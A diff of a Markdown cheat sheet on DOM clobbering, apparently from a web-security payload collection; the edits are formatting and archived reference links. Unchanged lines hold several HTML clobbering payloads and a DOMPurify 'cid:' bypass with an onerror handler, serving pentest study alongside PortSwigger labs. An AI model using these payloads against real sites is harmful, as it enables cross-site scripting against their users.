@@ -6,9 +6,8 @@
 
 - [Tools](#tools)
 - [Methodology](#methodology)
-- [Lab](#lab)
+- [Labs](#labs)
 - [References](#references)
-
 
 ## Tools
 
@@ -16,12 +15,12 @@
 - [yeswehack/Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) - A web-based tool designed for testing various HTML parsers and sanitizers.
 - [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==) - Reveal how browsers parse HTML and find mutated XSS vulnerabilities
 
-
 ## Methodology
 
 Exploitation requires any kind of `HTML injection` in the page.
 
-* Clobbering `x.y.value`
+- Clobbering `x.y.value`
+
     ```html
     // Payload
     <form id=x><output id=y>I've been clobbered</output>
@@ -30,7 +29,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     <script>alert(x.y.value);</script>
     ```
 
-* Clobbering `x.y` using ID and name attributes together to form a DOM collection
+- Clobbering `x.y` using ID and name attributes together to form a DOM collection
+
     ```html
     // Payload
     <a id=x><a id=x name=y href="Clobbered">
@@ -39,7 +39,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     <script>alert(x.y)</script>
     ```
 
-* Clobbering `x.y.z` - 3 levels deep
+- Clobbering `x.y.z` - 3 levels deep
+
     ```html
     // Payload
     <form id=x name=y><input id=z></form>
@@ -49,7 +50,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     <script>alert(x.y.z)</script>
     ```
 
-* Clobbering `a.b.c.d` - more than 3 levels
+- Clobbering `a.b.c.d` - more than 3 levels
+
     ```html
     // Payload
     <iframe name=a srcdoc="
@@ -60,7 +62,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     <script>alert(a.b.c.d)</script>
     ```
 
-* Clobbering `forEach` (Chrome only)
+- Clobbering `forEach` (Chrome only)
+
     ```html
     // Payload
     <form id=x>
@@ -72,7 +75,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     <script>x.y.forEach(element=>alert(element))</script>
     ```
 
-* Clobbering `document.getElementById()` using `<html>` or `<body>` tag with the same `id` attribute
+- Clobbering `document.getElementById()` using `<html>` or `<body>` tag with the same `id` attribute
+
     ```html
     // Payloads
     <html id="cdnDomain">clobbered</html>
@@ -85,7 +89,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     </script>
     ```
 
-* Clobbering `x.username`
+- Clobbering `x.username`
+
     ```html
     // Payload
     <a id=x href="ftp:Clobbered-username:Clobbered-Password@a">
@@ -97,7 +102,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     </script>
     ```
 
-* Clobbering (Firefox only)
+- Clobbering (Firefox only)
+
     ```html
     // Payload
     <base href=a:abc><a id=x href="Firefox<>">
@@ -108,7 +114,8 @@ Exploitation requires any kind of `HTML injection` in the page.
     </script>
     ```
 
-* Clobbering (Chrome only)
+- Clobbering (Chrome only)
+
     ```html
     // Payload
     <base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
@@ -119,23 +126,20 @@ Exploitation requires any kind of `HTML injection` in the page.
     </script>
     ```
 
-
 ## Tricks
 
-* DomPurify allows the protocol `cid:`, which doesn't encode double quote (`"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
+- DomPurify allows the protocol `cid:`, which doesn't encode double quote (`"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
 
-
-## Lab
+## Labs
 
 - [PortSwigger - Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
 - [PortSwigger - Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
 - [PortSwigger - DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)
 
-
 ## References
 
-- [Bypassing CSP via DOM clobbering - Gareth Heyes - 05 June 2023](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
-- [DOM Clobbering - HackTricks - January 27, 2023](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
-- [DOM Clobbering - PortSwigger - September 25, 2020](https://portswigger.net/web-security/dom-based/dom-clobbering)
-- [DOM Clobbering strikes back - Gareth Heyes - 06 February 2020](https://portswigger.net/research/dom-clobbering-strikes-back)
-- [Hijacking service workers via DOM Clobbering - Gareth Heyes - 29 November 2022](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
+- [Bypassing CSP via DOM clobbering - Gareth Heyes - June 5, 2023](https://web.archive.org/web/20251114182213/https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
+- [DOM Clobbering - HackTricks - January 27, 2023](https://web.archive.org/web/20241215205040/https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
+- [DOM Clobbering - PortSwigger - September 25, 2020](https://web.archive.org/web/20260218083100/https://portswigger.net/web-security/dom-based/dom-clobbering)
+- [DOM Clobbering strikes back - Gareth Heyes - February 6, 2020](https://web.archive.org/web/20200224065316/https://portswigger.net/research/dom-clobbering-strikes-back)
+- [Hijacking service workers via DOM Clobbering - Gareth Heyes - November 29, 2022](https://web.archive.org/web/20260123013910/https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
